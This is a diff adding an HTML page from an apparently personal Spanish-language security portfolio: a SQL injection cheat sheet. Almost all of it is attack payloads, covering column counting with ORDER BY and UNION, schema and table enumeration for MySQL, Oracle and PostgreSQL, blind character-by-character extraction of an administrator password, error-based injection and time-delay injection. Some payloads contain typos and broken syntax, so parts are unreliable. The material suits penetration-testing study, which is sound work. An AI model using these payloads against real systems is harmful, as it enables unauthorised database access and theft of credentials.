@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SQL Injection Cheat Sheet | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../index.html#cheatsheets" class="nav-link">← Cheat Sheets</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <h1 class="writeup-title">💉 SQL Injection — Cheat Sheet</h1>
+    </div>
+    <div class="writeup-body">
+
+<p>1- Verificar si hay una SQLi en alguna entrada de usuario o algo que este siendo enviado a una <strong>QUERY</strong></p>
+
+<pre><code>' #para romper query 
+<p>\\</p>
+<p>\\\</p>
+<p>' '</p>
+<p>"</p>
+<p>""</code></pre></p>
+
+<hr>
+
+<p>2- Verificar si es blind o tradicional</p>
+
+<hr>
+
+<h1>Tradicional (UNION SELECT )</h1>
+
+
+<h2> Fase 1: Identificar número de columnas</h2>
+
+<h3>Método ORDER BY</h3>
+
+<pre><code>admin' ORDER BY 1-- -
+<p>admin' ORDER BY 2-- -</p>
+<p>admin' ORDER BY 3-- -</code></pre></p>
+<strong>Indicador de éxito</strong>: Cuando el ORDER BY falla, el número anterior es el total de columnas.
+
+<h3>Método UNION SELECT NULL</h3>
+
+
+<pre><code>' UNION SELECT NULL-- -
+<p>' UNION SELECT NULL,NULL-- -</p>
+<p>' UNION SELECT NULL,NULL,NULL-- -</code></pre></p>
+
+<h2>Fase 2: Identificar tipos de datos</h2>
+
+<h3>Probar columnas con diferentes tipos</h3>
+
+<pre><code>' UNION SELECT 'test',NULL,NULL-- -
+<p>' UNION SELECT NULL,'test',NULL-- -</p>
+<p>' UNION SELECT 1,'test',NULL-- -</code></pre></p>
+<strong>Objetivo</strong>: Determinar qué columnas aceptan strings para mostrar datos.
+
+<h2>Fase 3: Explotación con UNION SELECT</h2>
+
+<h3>Consultas esenciales para enumeración:</h3>
+
+<h3>1. Listar bases de datos</h3>
+
+<pre><code>' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -</code></pre>
+
+<h3>2. Listar tablas de una base de datos</h3>
+
+
+<pre><code>' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -</code></pre>
+
+<h3>3. Listar columnas de una tabla</h3>
+
+<pre><code>' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema='database' AND table_name='tabla'-- -</code></pre>
+<h3>Fase 4: Fingerprinting y metadata</h3>
+
+<h3>Identificar versión de BD</h3>
+
+<pre><code>-- MySQL/Microsoft
+<p>' UNION SELECT @@version,NULL-- -</p>
+
+<p>-- Oracle</p>
+<p>' UNION SELECT * FROM v$version-- -</p>
+
+<p>-- PostgreSQL</p>
+<p>' UNION SELECT version(),NULL-- -</code></pre></p>
+
+<hr>
+
+<h1>Oracle Database (UNION SELECT) </h1>
+
+<h2>Fase 1: Identificar número de columnas</h2>
+
+<h3>Método ORDER BY</h3>
+
+<pre><code>admin' ORDER BY 1-- -
+<p>admin' ORDER BY 2-- -</p>
+<p>admin' ORDER BY 3-- -</code></pre></p>
+
+<strong>Indicador de éxito</strong>: Cuando el ORDER BY falla, el número anterior es el total de columnas.
+
+<pre><code>' UNION SELECT NULL FROM DUAL-- -
+<p>' UNION SELECT NULL,NULL FROM DUAL-- -</p>
+<p>' UNION SELECT NULL,NULL,NULL FROM DUAL-- -</code></pre></p>
+
+<h2>Fase 2: Identificar tipos de datos</h2>
+
+<h3>Probar columnas con diferentes tipos</h3>
+
+<pre><code>' UNION SELECT 'test',NULL FROM DUAL-- -
+<p>' UNION SELECT NULL,'test' FROM DUAL-- -</p>
+<p>' UNION SELECT 1,'test' FROM DUAL-- -</code></pre></p>
+
+<strong>Objetivo</strong>: Determinar qué columnas aceptan strings para mostrar datos.
+
+<h2>Fase 3: Explotación con UNION SELECT</h2>
+
+<h3>Consultas esenciales para enumeración:</h3>
+
+<h3>1. Listar bases de datos (esquemas)</h3>
+<code>' UNION SELECT username,NULL FROM all_users-- -</code>
+<h3>2. Listar tablas de un esquema</h3>
+<code>' UNION SELECT table_name,NULL FROM all_tables WHERE owner='NOMBRE_ESQUEMA'-- -</code>
+<h3>3. Listar columnas de una tabla</h3>
+<code>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE owner='ESQUEMA' AND table_name='TABLA'-- -</code>
+<h3>4. Extraer datos de una tabla</h3>
+<code>' UNION SELECT columna1,colaumna2 FROM ESQUEMA.TABLA-- -</code>
+
+
+
+<h1>SQL BLIND</h1>
+
+<hr>
+
+<h2>Uso de SUBSTRING con respuestas condicionales</h2>
+
+<h3><strong>Paso 1: Definir Query Objetivo</strong></h3>
+<pre><code>(SELECT password FROM users WHERE username='administrator')</code></pre>
+<h3><strong>Paso 2: Determinar Longitud con LENGTH</strong></h3>
+<pre><code>' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=1--
+<p>' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=2--</p>
+<p>' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--</code></pre></p>
+<h3><strong>Paso 3: Extraer Carácter por Carácter con SUBSTRING</strong></h3>
+
+<pre><code>Sintaxis: SUBSTRING(query, posición, longitud)
+ 
+<p>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--</p>
+
+<p>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b--</p>
+
+<p>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='c--</code></pre></p>
+<h3><strong>Paso 4: Iterar Todas las Posiciones</strong></h3>
+
+
+<hr>
+
+<h2>Uso de SUBSTRING con respuestas condicionales (2)</h2>
+
+<p>usamos esta función cuando queremos ir obteniendo los valores de la string que retorna una consulta en SQL, uno por uno. Hacemos uso de respuesta condicionales ya que igualamos el resultado de la consulta a algo para saber si es igual o no a eso.</p>
+
+<p>La metodología es simple:</p>
+
+<p>> 1-Buscamos una query de la cual queremos saber el valor que retorna y la concatenamos a la query del servidor con <code>and</code></p>
+
+<p>> 2-Le pasamos la query a la función <code>LENGTH</code> para saber la longitud de la cadena de respuesta</p>
+
+<p>>3 - Le pasamos esa query como string a la función <code>SUBSTRING()</code></p>
+
+<p>>3- vamos iterando por posiciones y valores hasta obtener el valor completo del resultado de la consulta</p>
+
+<p>ej:</p>
+<pre><code>' AND (SELECT SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))='a'--</code></pre>
+
+
+
+<hr>
+
+<h2>Error-Based Condicionales</h2>
+
+<p>Sintaxis</p>
+
+<pre><code>' AND SELECT CASE WHEN (#CONDICION) THEN 1/0 ELSE '' END  <-other DBs
+
+<p>|| AND SELECT CASE WHEN (#CONDICION) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL   <- Oracle</code></pre></p>
+
+<p>EJ:</p>
+
+<pre><code>' AND SELECT CASE WHEN (SUBSTRING(passoword),1,1)='a' THEN 1/0 ELSE '' END FROM user WHERE username='administrator'</code></pre>
+
+
+<hr>
+<h2>Visible Errors-Based</h2>
+
+<p>En lugar de depender de "error vs no error" como en el método ciego, aquí <strong>convertimos los datos en parte del mensaje de error mismo</strong>.</p>
+
+<p>Usamos CAST() para convertir un tipo de dato a otro y que se muestre el Error en Pantalla</p>
+<pre><code>' AND 1=CAST((#query) as int)--
+<p>' AND 1 = CAST((SELECT password FROM users LIMIT 1) as int)</code></pre></p>
+
+<hr>
+<h2>Delays-Based</h2>
+
+
+<p>Esta es la forma en que podemos provocar un delay en las distintas bases de datos:</p>
+
+<p>Oracle:<code>dbms_pipe.receive_message(('a'),10)</code></p>
+<p>Microsoft 	<code>WAITFOR DELAY '0:0:10'</code></p>
+<p>PostgreSQL 	<code>SELECT pg_sleep(10)</code></p>
+<p>MySQL 	<code>SELECT SLEEP(10)</code></p>
+
+
+
+<h3>Conditional time delays</h3>
+
+
+<p>Oracle:</p>
+<pre><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 
+<p>'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></pre></p>
+<p>Microsoft:</p>
+<pre><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></pre>
+<p>PostgreSQL:</p>
+<pre><code>PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></pre>
+<p>MySQL:</p>
+<pre><code>SELECT IF(YOUR-CONDITION-HERE,THEN-ACTION,ELSE-ACTION) 
+<p>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'A')</code></pre></p>
+
+    </div>
+  </div>
+</body>
+</html>
